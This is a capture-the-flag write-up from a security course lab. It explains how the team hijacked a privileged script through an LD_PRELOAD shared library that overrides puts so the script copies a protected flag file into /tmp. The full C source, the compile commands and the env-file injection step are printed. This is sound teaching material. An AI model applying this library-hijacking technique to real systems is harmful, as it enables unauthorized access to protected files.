# CTF 2 - Linux Environment

## 1. Reconnaissance

We were told that there would be a Linux server (running the same OS used in SEED Labs - Ubuntu 20.04) available at http://ctf-fsi.fe.up.pt:4006, in which there was a script that ran regularly. To connect to it, we had to use the `netcat` shell program as follows: `nc ctf-fsi.fe.up.pt 4006`.
We started by gathering information about what was going on in the server. The first thing we did was to open the *admin_note.txt* file.

![admin-note](images/linux-env-ctf/admin-note.png)

From the contents of the file, it seems we need to target the */tmp* folder to retrieve the flag. We got further confirmation of this after running the ```ls -l``` command, which showed that the *env* file is a symbolic link to the *env* file in the */tmp* folder.

![home-files](images/linux-env-ctf/home_ls.png)

Before moving on, since the script runs regularly on the server, we decided to check the contents of the *my_script.sh* file as well.

```bash
#!/bin/bash

if [ -f "/home/flag_reader/env" ]; then
    echo "Sourcing env"
    export $(/usr/bin/cat /home/flag_reader/env | /usr/bin/xargs)
    echo "" > /home/flag_reader/env
fi

printenv
exec /home/flag_reader/reader
```

Analyzing the code, we concluded that this script checks for the existence of an *env* file, after which it sets environment variables based on its content, clears the file, displays the environment variables and, finally, runs the *reader* file (which is the executable for *main.c*).

## 2. Searching for/Choosing a Vulnerability

Using the information we had collected in the previous step, we set out to find a vulnerability that would allow us to exploit the system in order to retrieve the flag.
Before we went any further, we decided to revisit the ***Environment Variable and Set-UID Program*** SEED Lab. While searching for clues on what to do next, we came across Task 7, which involved the use of the **LD_PRELOAD** environment variable.

![task-7](images/linux-env-ctf/task_7.png)

We then decided to open the *main.c* file and check what code was being run in the *reader* file.

```c
#include <stdio.h>
#include <unistd.h>

void my_big_congrats(){
    puts("TODO - Implement this in the near future!");
}

int main() {
    puts("I'm going to check if the flag exists!");

    if (access("/flags/flag.txt", F_OK) == 0) {
        puts("File exists!!");
        my_big_congrats();
    } else {
        puts("File doesn't exist!");
    }

    return 0;
}
```

We attempted to access the */flags* folder, but we didn't have permission to do so.

## 3. Finding an Exploit

Taking into account what we had learned in the SEED Lab and the code in *main.c*, we decided to override the ```puts``` function using a dynamic link library. To achieve this, we wrote the following program:

```c
#include <stdio.h>
#include <stdlib.h>

extern int puts(const char *s) {
	system("/bin/cat /flags/flag.txt > /tmp/file");
	return 0;
}
```

This would allow us to hopefully override the ```puts``` function and extract the flag from the */flags* folder into a file in the */tmp* folder, where we would be able to access to the flag.

## 4. Exploring the Vulnerability

With our program ready, we then went through the following steps:

- Create a file to write the flag and change its permissions so that anyone can do anything (read, write, or execute)

```bash
touch /tmp/file
chmod 777 /tmp/file
```

- Compile the program and create a shared library (utilizing the commands used in the aforementioned SEED Lab task)

```bash
gcc -fPIC -g -c script.c
gcc -shared -o script.so script.o -lc
```

- Store the LD_PRELOAD environment variable on */tmp/env*

```bash
echo "LD_PRELOAD=/tmp/script.so" > env
```

When running *my_script.sh*, our program would run when the ```puts``` funtion was called.
After waiting for a while, we checked the file we created and found the flag we were looking for.

![flag](images/linux-env-ctf/flag-linuxenvironment.png)